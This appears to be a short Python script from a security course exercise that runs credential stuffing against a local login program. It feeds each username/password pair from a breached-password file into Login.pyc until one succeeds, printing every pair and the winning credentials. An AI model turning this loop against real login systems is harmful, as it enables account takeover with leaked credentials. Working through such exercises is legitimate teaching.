import sys
import datetime
import subprocess

start = datetime.datetime.now()
print(datetime.datetime.now())

# file opening
with open('../Q4/PwnedPWfile', 'r') as file:
    userpasses = file.read().splitlines()

username = ""
password = ""

for userpass in userpasses:
    # parsing each line
    userpass_arr = userpass.split(',')
    username = userpass_arr[0]
    password = userpass_arr[1]
    
    result = subprocess.run(['python3', '../Q4/Login.pyc', username, password], capture_output=True, text=True)
    print(f"{username} {password}")
    if result.stdout=='Login successful.\n':
        break
print(start)
print(f"User: {username} Pass: {password}")
print(datetime.datetime.now())
